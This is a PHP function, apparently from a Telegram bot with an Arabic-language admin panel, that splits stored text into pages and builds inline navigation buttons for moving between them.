function handlePaginatedMessage($chat_id, $message_id, $file_id, $page, $context) {
    $file_path = PAGINATION_TEMP_DIR . $file_id . '.json';
    if (!file_exists($file_path)) {
        editMessage($chat_id, $message_id, "⚠️ انتهت الصلاحية.", showAdminPanelKeyboard());
        return;
    }
    $temp_data = json_decode(file_get_contents($file_path), true);
    $chunks = mb_str_split($temp_data['text'], MAX_MESSAGE_LENGTH, 'UTF-8');
    $total = count($chunks);
    if ($page < 0 || $page >= $total) $page = 0;
    
    $nav = [];
    if ($page > 0) $nav[] = ['text' => '◀️', 'callback_data' => "paginate_message:{$file_id}:" . ($page - 1) . ":{$context}"];
    $nav[] = ['text' => "{$page}/" . ($total - 1), 'callback_data' => "ignore"];
    if ($page < $total - 1) $nav[] = ['text' => '▶️', 'callback_data' => "paginate_message:{$file_id}:" . ($page + 1) . ":{$context}"];
    
    $keyboard = ['inline_keyboard' => [$nav, [['text' => '🔙 العودة', 'callback_data' => 'admin_panel']]]];
    editMessage($chat_id, $message_id, $chunks[$page] . "\n\nصفحة {$page} من " . ($total - 1), json_encode($keyboard));
}
?>
